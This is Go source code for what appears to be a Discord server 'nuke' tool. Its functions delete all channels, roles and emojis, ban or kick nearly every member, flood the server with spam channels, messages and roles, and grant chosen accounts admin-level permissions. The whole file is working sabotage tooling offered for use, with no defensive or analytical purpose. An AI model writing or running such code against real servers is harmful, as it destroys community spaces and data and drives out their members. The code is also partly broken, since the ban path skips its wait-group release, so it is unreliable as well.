package main

import (
	"math/rand"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"golang.org/x/exp/slices"
)

func (na NukeAccount) makeChannels() error {
	wg := sync.WaitGroup{}
	for i := 0; i < na.Config.FeatureConfig.AfterChannel.ChannelAmount; i++ {
		wg.Add(1)
		go func() {
			logger.Println("Channel created")
			channel, err := na.Session.GuildChannelCreate(na.Config.GuildID, na.Config.FeatureConfig.AfterChannel.ChannelName, discordgo.ChannelTypeGuildText)
			if err != nil {
				logger.Errorf("Error creating channel: %s", err)
			}
			for i := 0; i < na.Config.FeatureConfig.AfterChannel.MessageRepetitions; i++ {
				na.Session.ChannelMessageSend(channel.ID, na.Config.FeatureConfig.AfterChannel.Message)
			}
			wg.Done()
		}()

	}
	wg.Wait()
	return nil
}

func (na NukeAccount) deleteChannels() error {
	wg := sync.WaitGroup{}
	channels, err := na.Session.GuildChannels(na.Config.GuildID)
	if err != nil {
		return err
	}
	for _, channel := range channels {
		if channel.Name == na.Config.FeatureConfig.AfterChannel.ChannelName {
			continue
		}
		wg.Add(1)
		go func(channelID string) {
			_, err := na.Session.ChannelDelete(channelID)
			if err != nil {
				logger.Errorln(err)
			}
			wg.Done()
		}(channel.ID)
	}
	wg.Wait()
	return nil
}
func (na NukeAccount) deleteRoles() error {
	wg := sync.WaitGroup{}
	roles, err := na.Session.GuildRoles(na.Config.GuildID)
	if err != nil {
		return err
	}
	for _, role := range roles {
		wg.Add(1)
		go func(id string) {
			na.Session.GuildRoleDelete(na.Config.GuildID, id)
			wg.Done()
		}(role.ID)
	}
	wg.Wait()
	return nil
}
func (na NukeAccount) autoAdmin() error {
	myUser, err := na.Session.User("@me")
	if err != nil {
		return err
	}
	myMember, err := na.Session.GuildMember(na.Config.GuildID, myUser.ID)
	if err != nil {
		return err
	}
	niceColor := 16737894
	// I'm sorry if you wanted a custom role name. this is truly a sad moment for you
	role, err := na.Session.GuildRoleCreate(na.Config.GuildID, &discordgo.RoleParams{
		Name:        "Admin",
		Color:       &niceColor,
		Permissions: &myMember.Permissions,
	})
	if err != nil {
		return err
	}
	for _, id := range na.Config.FeatureConfig.AutoAdmin {
		na.Session.GuildMemberRoleAdd(na.Config.GuildID, id, role.ID)
	}
	return nil
}
func (na NukeAccount) removeMembers() error {
	wg := sync.WaitGroup{}
	exemptUsersTotal := append(na.Config.FeatureConfig.AutoAdmin, na.Config.FeatureConfig.MemberRemoval.Exempt...)
	exemptUsersTotal = removeDuplicate(exemptUsersTotal)
	memberIDs := na.getGuildMemberIDs()
	targetRemoves := len(memberIDs) - (1 + len(exemptUsersTotal))
	goodRemoves := targetRemoves
	myUser, err := na.Session.User("@me")
	if err != nil {
		return err
	}
	for _, id := range memberIDs {
		if id == myUser.ID || slices.Contains(exemptUsersTotal, id) {
			continue
		}
		wg.Add(1)
		go func(id string) {
			if na.Config.FeatureConfig.MemberRemoval.BanMembers {
				err := na.Session.GuildBanCreate(na.Config.GuildID, id, 7)
				if err != nil {
					goodRemoves--
				}
				return
			}
			err := na.Session.GuildMemberDelete(na.Config.GuildID, id)
			if err != nil {
				goodRemoves--
			}
			wg.Done()
		}(id)
	}
	wg.Wait()
	logger.Infof("Removed %d/%d members\n", goodRemoves, targetRemoves)
	return nil
}
func (na NukeAccount) deleteEmojis() error {

	emojiWg := sync.WaitGroup{}
	emojis, err := na.Session.GuildEmojis(na.Config.GuildID)
	if err != nil {
		return err
	}
	for _, emoji := range emojis {
		emojiWg.Add(1)
		go func(emojiID string) {
			na.Session.GuildEmojiDelete(na.Config.GuildID, emojiID)
			emojiWg.Done()
		}(emoji.ID)
	}
	emojiWg.Wait()
	return nil
}
func (na NukeAccount) roleSpam() error {
	randGen := rand.New(rand.NewSource(time.Now().UnixNano()))
	wg := sync.WaitGroup{}
	roleSpamConfig := na.Config.FeatureConfig.RoleSpam
	for i := 0; i < roleSpamConfig.RoleAmount; i++ {
		wg.Add(1)
		go func() {
			name := roleSpamConfig.RoleName
			if len(roleSpamConfig.RoleNames) > 0 {
				name = roleSpamConfig.RoleNames[randGen.Intn(len(roleSpamConfig.RoleNames))]
			}
			na.Session.GuildRoleCreate(na.Config.GuildID, &discordgo.RoleParams{
				Name:  name,
				Color: &roleSpamConfig.RoleColor,
			})
			wg.Done()
		}()
	}
	wg.Wait()
	return nil
}

// https://stackoverflow.com/questions/66643946/how-to-remove-duplicates-strings-or-int-from-slice-in-go
// no im not a bad programmer, i could have made this in like 3 minutes but i decided to just look it up
func removeDuplicate[T string | int](sliceList []T) []T {
	allKeys := make(map[T]bool)
	list := []T{}
	for _, item := range sliceList {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}
